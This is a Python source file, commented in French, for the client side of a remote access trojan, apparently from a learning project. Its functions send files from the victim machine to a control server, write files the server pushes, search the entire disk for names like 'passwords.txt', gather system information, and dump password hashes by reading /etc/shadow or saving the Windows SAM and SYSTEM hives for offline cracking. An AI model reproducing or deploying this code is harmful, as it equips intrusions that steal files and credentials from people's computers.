"""
Actions exécutées sur la machine victime (client RAT).

Chaque fonction correspond à une commande disponible dans le RAT.
Ce fichier est importé par client_app.py qui route les commandes
reçues du serveur vers la bonne fonction.

Compatibilité : Windows et Linux.
"""

import base64
import platform
from pathlib import Path

from rat_project.utils.logger_config import setup_logger

logger = setup_logger("client.actions")


# ---------------------------------------------------------------------------
# Helpers internes
# ---------------------------------------------------------------------------


def _get_os() -> str:
    """Retourne le nom du système d'exploitation ('Windows' ou 'Linux')."""
    return platform.system()


# ---------------------------------------------------------------------------
# download — envoi d'un fichier de la victime vers le serveur
# ---------------------------------------------------------------------------


def handle_download(remote_path: str) -> dict:
    """
    Lit un fichier sur la machine victime et l'encode en base64
    pour l'envoyer au serveur.

    Le serveur a demandé ce fichier via la commande 'download <path>'.
    Le contenu est encodé en base64 car le protocole est JSON (texte).

    Args:
        remote_path: Chemin absolu ou relatif du fichier sur la victime.

    Returns:
        dict: Réponse avec le contenu encodé en base64, ou une erreur.
    """
    path = Path(remote_path)

    # Vérification que le fichier existe
    if not path.exists():
        logger.warning("Download demandé mais fichier introuvable : %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Fichier introuvable : {remote_path}",
        }

    # Vérification que c'est bien un fichier (pas un dossier)
    if not path.is_file():
        logger.warning("Download demandé mais le chemin n'est pas un fichier : %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Le chemin n'est pas un fichier : {remote_path}",
        }

    try:
        # Lecture binaire + encodage base64 pour passer dans le JSON
        file_bytes = path.read_bytes()
        encoded = base64.b64encode(file_bytes).decode("utf-8")

        logger.info("Download : %s (%s octets)", remote_path, len(file_bytes))

        return {
            "type": "command_result",
            "command": "download",
            "filename": path.name,
            "data": encoded,
            "output": f"Fichier envoyé : {path.name} ({len(file_bytes)} octets)",
        }

    except PermissionError:
        logger.warning("Download refusé (permissions) : %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Permission refusée : {remote_path}",
        }

    except Exception as exc:
        logger.exception("Erreur lors du download de %s : %s", remote_path, exc)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Erreur : {exc}",
        }


# ---------------------------------------------------------------------------
# upload — réception d'un fichier envoyé par le serveur
# ---------------------------------------------------------------------------


def handle_upload(message: dict) -> dict:
    """
    Reçoit un fichier envoyé par le serveur et l'écrit sur la victime.

    Le serveur a encodé le fichier en base64 dans le message.
    On le décode et on l'écrit dans le répertoire courant de l'agent.

    Args:
        message: Message du serveur contenant 'filename' et 'data' (base64).

    Returns:
        dict: Confirmation d'écriture ou message d'erreur.
    """
    filename = message.get("filename", "uploaded_file")
    encoded_data = message.get("data", "")

    if not encoded_data:
        logger.warning("Upload reçu mais aucune donnée dans le message")
        return {
            "type": "command_result",
            "command": "upload",
            "error": "Aucune donnée reçue.",
        }

    try:
        # Décodage base64 → bytes → écriture sur disque
        file_bytes = base64.b64decode(encoded_data)
        save_path = Path(filename)
        save_path.write_bytes(file_bytes)

        logger.info("Upload reçu et sauvegardé : %s (%s octets)", save_path, len(file_bytes))

        return {
            "type": "command_result",
            "command": "upload",
            "output": f"Fichier reçu et sauvegardé : {save_path} ({len(file_bytes)} octets)",
        }

    except Exception as exc:
        logger.exception("Erreur lors de l'upload de %s : %s", filename, exc)
        return {
            "type": "command_result",
            "command": "upload",
            "error": f"Erreur : {exc}",
        }


# ---------------------------------------------------------------------------
# search — rechercher un fichier sur la machine victime
# ---------------------------------------------------------------------------


def search_file(filename: str) -> str:
    """
    Recherche un fichier par nom sur toute la machine victime.

    Args:
        filename: Nom du fichier à chercher (ex: "passwords.txt").

    Returns:
        str: Liste des chemins trouvés, ou message si aucun résultat.
    """
    results = []

    # Recherche récursive depuis la racine
    root = Path("C:/") if _get_os() == "Windows" else Path("/")

    for path in root.rglob(filename):
        try:
            results.append(str(path))
        except PermissionError:
            continue

    if not results:
        return f"Aucun fichier trouvé pour : {filename}"

    return "\n".join(results)


# ---------------------------------------------------------------------------
# Fonctions à implémenter dans les prochaines étapes
# ---------------------------------------------------------------------------


def get_system_info() -> str:
    """Retourne les informations système (sysinfo)."""
    import locale
    import subprocess

    system_name = _get_os()
    command = "systeminfo" if system_name == "Windows" else "uname -a"
    encoding = "cp850" if system_name == "Windows" else locale.getpreferredencoding(False)

    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        encoding=encoding,
        errors="replace",
        check=False,
    )
    return result.stdout.strip() or result.stderr.strip() or "Aucune sortie"


# ---------------------------------------------------------------------------
# hashdump — récupération des hashes de mots de passe
# ---------------------------------------------------------------------------


def hashdump() -> str:
    """
    Retrieve password hashes depending on the OS.

    - Linux   : reads /etc/shadow (requires root privileges)
    - Windows : saves SAM and SYSTEM hives via reg.exe
                (requires Administrator privileges)

    Returns:
        str: Shadow file content, saved hive paths, or an error message.
    """
    import subprocess
    import tempfile
    from pathlib import Path

    os_name = _get_os()

    if os_name == "Linux":
        shadow_path = Path("/etc/shadow")
        try:
            content = shadow_path.read_text(encoding="utf-8")
            logger.info("hashdump Linux: %d lines retrieved", content.count("\n"))
            return content
        except PermissionError:
            logger.warning("hashdump: permission denied for %s (root required)", shadow_path)
            return f"Error: permission denied to read {shadow_path} (root required)"
        except FileNotFoundError:
            return f"Error: {shadow_path} not found"
        except Exception as exc:
            logger.exception("hashdump Linux error: %s", exc)
            return f"Error: {exc}"

    elif os_name == "Windows":
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                sam_path = str(Path(tmpdir) / "SAM")
                system_path = str(Path(tmpdir) / "SYSTEM")

                # Saves hives 
                for hive, dest in [("HKLM\\SAM", sam_path), ("HKLM\\SYSTEM", system_path)]:
                    result = subprocess.run(
                        ["reg", "save", hive, dest, "/y"],
                        capture_output=True,
                        text=True,
                        check=False,
                    )
                    if result.returncode != 0:
                        logger.warning("hashdump Windows error on %s: %s", hive, result.stderr.strip())
                        return f"Error saving {hive}: {result.stderr.strip()}"

                logger.info("hashdump Windows: SAM and SYSTEM hives saved")
                return (
                    f"Hives saved:\n"
                    f"  SAM    -> {sam_path}\n"
                    f"  SYSTEM -> {system_path}\n"
                    "(Binary files — use secretsdump or impacket to extract hashes)"
                )
        except Exception as exc:
            logger.exception("hashdump Windows error: %s", exc)
            return f"Error: {exc}"

    else:
        return f"Unsupported OS for hashdump: {os_name}"
